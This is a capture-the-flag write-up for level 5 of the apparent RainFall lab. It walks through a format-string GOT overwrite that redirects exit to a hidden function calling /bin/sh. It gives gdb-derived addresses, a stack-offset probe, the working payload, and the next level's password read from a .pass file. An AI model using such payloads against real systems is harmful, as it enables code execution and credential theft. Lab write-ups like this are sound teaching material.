# level 5

In this level, we will use a GOT (global offset table) overwrite exploit

While watching the asm code, we found that there is a function `n` called by the main and a function `o` don't called which is doing a system("/bin/sh")

According to the [gdb explains](gdbwriteup.md), we found the address of the `exit` and the address of the `o` function

-------------------------
| call    | address    |
|---------|------------|
| exit    | 0x8049838  |
| /bin/sh | 0x80485f0  |
|    o    | 0x080484a4 |
-----------------------
This time, program is also calling a printf, let's see where our content will be written
```bash
level5@RainFall:~$ python -c "print('BBBB' + ' %p ' * 8)" | ./level5 
BBBB 0x200  0xb7fd1ac0  0xb7ff37d0  0x42424242  0x20702520  0x20702520  0x20702520  0x20702520
```
0x42424242 is present in the 4th address

Now, we will modify the adress of `exit` by the address of `o` to execute /bin/sh

```bash
(python -c 'print("\x38\x98\x04\x08" + "%134513824c%4$n")'; cat)  | ./level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

